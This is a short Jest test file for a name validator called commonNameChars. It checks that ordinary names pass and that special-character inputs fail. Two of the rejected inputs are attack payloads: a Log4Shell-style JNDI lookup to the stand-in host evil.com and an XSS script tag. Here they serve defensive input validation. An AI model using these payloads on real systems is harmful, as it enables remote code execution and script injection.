import { commonNameChars } from "./useValidation";

describe("Common Naming Characters", () => {
  test("It should return false if special characters present", () => {
    expect(commonNameChars("${jndi:ldap://evil.com}")).toEqual(false);
    expect(commonNameChars("<script>alert('xss')</script>")).toEqual(false);
    expect(commonNameChars("123")).toEqual(false);
    expect(commonNameChars("Tom")).toEqual(true);
    expect(commonNameChars("Robert Downey Jr.")).toEqual(true);
    expect(commonNameChars("Sinéad O'Connor")).toEqual(true); // has char with accent
    expect(commonNameChars("Leah Organa-Vader")).toEqual(true);
    expect(commonNameChars("Tom")).toEqual(true);
  });
});
